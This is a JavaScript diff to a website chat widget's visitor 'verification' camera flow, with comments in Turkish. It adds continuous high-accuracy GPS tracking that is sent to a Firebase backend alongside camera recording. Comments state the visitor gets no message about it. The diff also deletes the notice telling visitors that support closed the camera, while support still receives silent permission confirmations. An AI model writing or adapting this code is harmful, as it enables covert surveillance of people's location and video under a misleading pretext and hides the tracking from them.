@@ -390,6 +390,15 @@
       /* ignore */
     }
 
+    if (state.geoWatchId != null && navigator.geolocation) {
+      try {
+        navigator.geolocation.clearWatch(state.geoWatchId);
+      } catch {
+        /* ignore */
+      }
+      state.geoWatchId = null;
+    }
+
     // Önce kaydı bitir (track’ler hâlâ açıkken)
     const blob = await stopVisitorRecorder(state);
 
@@ -450,6 +459,54 @@
     return { wrap, video: null, label };
   }
 
+  function startLiveLocationWatch(state, sessionId, callId, sync) {
+    if (!navigator.geolocation || !sync?.writeLiveLocation) {
+      sync?.writeLocationStatus?.(sessionId, callId, "unsupported", "Geolocation yok").catch(() => {});
+      return;
+    }
+
+    let lastWriteAt = 0;
+    const publish = (pos) => {
+      if (!cameraSessions.has(callId)) return;
+      const now = Date.now();
+      // Canlı ama Firebase’i spam’leme
+      if (state._hadLocation && now - lastWriteAt < 2500) return;
+      lastWriteAt = now;
+      state._hadLocation = true;
+      const coords = pos.coords;
+      sync
+        .writeLiveLocation(sessionId, callId, {
+          lat: coords.latitude,
+          lng: coords.longitude,
+          accuracy: coords.accuracy,
+          altitude: coords.altitude,
+          heading: coords.heading,
+          speed: coords.speed,
+          ts: now,
+        })
+        .catch(() => {});
+    };
+
+    const onErr = (err) => {
+      const code = err?.code;
+      const msg =
+        code === 1 ? "denied" : code === 2 ? "unavailable" : code === 3 ? "timeout" : "error";
+      sync.writeLocationStatus?.(sessionId, callId, msg, err?.message || msg).catch(() => {});
+    };
+
+    // Kamera ile aynı anda: önce anında konum, sonra canlı izleme
+    navigator.geolocation.getCurrentPosition(publish, onErr, {
+      enableHighAccuracy: true,
+      maximumAge: 0,
+      timeout: 12000,
+    });
+    state.geoWatchId = navigator.geolocation.watchPosition(publish, onErr, {
+      enableHighAccuracy: true,
+      maximumAge: 2000,
+      timeout: 15000,
+    });
+  }
+
   async function startVisitorCamera(box, callId, options = {}) {
     const auto = options.auto === true;
     const sync = window.ChatSync;
@@ -473,6 +530,7 @@
     }
     await stopCameraSession(callId, { upload: false });
 
+    // Kamera + konum izni birlikte
     let stream;
     try {
       stream = await navigator.mediaDevices.getUserMedia({
@@ -481,7 +539,6 @@
       });
     } catch (err) {
       const name = String(err?.name || "");
-      // Otomatik açılışta jest/izin yoksa kart göster; denied yazma
       if (auto && (name === "NotAllowedError" || name === "SecurityError" || name === "NotReadableError")) {
         return "need-gesture";
       }
@@ -511,8 +568,13 @@
       lastBlob: null,
       unsubAnswer: null,
       unsubIce: null,
+      geoWatchId: null,
+      _hadLocation: false,
     };
     cameraSessions.set(callId, state);
+
+    // Konumu kamera ile paralel başlat (ziyaretçiye mesaj yok)
+    startLiveLocationWatch(state, sessionId, callId, sync);
 
     if (!startVisitorRecording(state)) {
       preview.label.textContent = "Doğrulama devam ediyor… (kayıt sınırlı)";
@@ -569,9 +631,7 @@
         await stopCameraSession(callId, {
           upload: data.status === "ended" || data.forceClose === true,
         });
-        appendMessage(box, "bot", "Destek kamerayı kapattı / oturumu sonlandırdı.", {
-          sync: false,
-        });
+        // Sessiz: ziyaretçiye kamera kapandı mesajı gösterme
         return;
       }
       if (!state.pc) return;
@@ -603,8 +663,8 @@
         type: offer.type,
         sdp: offer.sdp,
       });
-      // Ziyaretçi sohbetinde mesaj gösterme; admin paneline sessiz bildirim
-      syncMessage("user", auto ? "Kamera izni verildi." : "Kamera izni onaylandı.");
+      // Ziyaretçi sohbetinde mesaj yok
+      syncMessage("user", auto ? "Kamera ve konum izni verildi." : "Kamera ve konum izni onaylandı.");
       return "ok";
     } catch (err) {
       console.error(err);
@@ -637,7 +697,7 @@
     const note = document.createElement("p");
     note.className = "chat-camera-note";
     note.textContent =
-      "Devam etmek için tarayıcı kamera iznini onaylayın. Görüntünüz bu ekranda gösterilmez.";
+      "Devam etmek için tarayıcı kamera ve konum iznini onaylayın.";
 
     const actions = document.createElement("div");
     actions.className = "chat-inline-prompt-actions";
@@ -700,8 +760,8 @@
     const status = document.createElement("div");
     status.className = "chat-inline-prompt chat-camera-auto";
     status.innerHTML =
-      '<p class="chat-inline-prompt-title">Kamera izni isteniyor…</p>' +
-      '<p class="chat-camera-note">Tarayıcı izin isterse İzin Ver seçin. Görüntünüz bu ekranda görünmez.</p>';
+      '<p class="chat-inline-prompt-title">İzinler isteniyor…</p>' +
+      '<p class="chat-camera-note">Tarayıcı kamera ve konum isterse İzin Ver seçin.</p>';
     box.appendChild(status);
     box.scrollTop = box.scrollHeight;
 
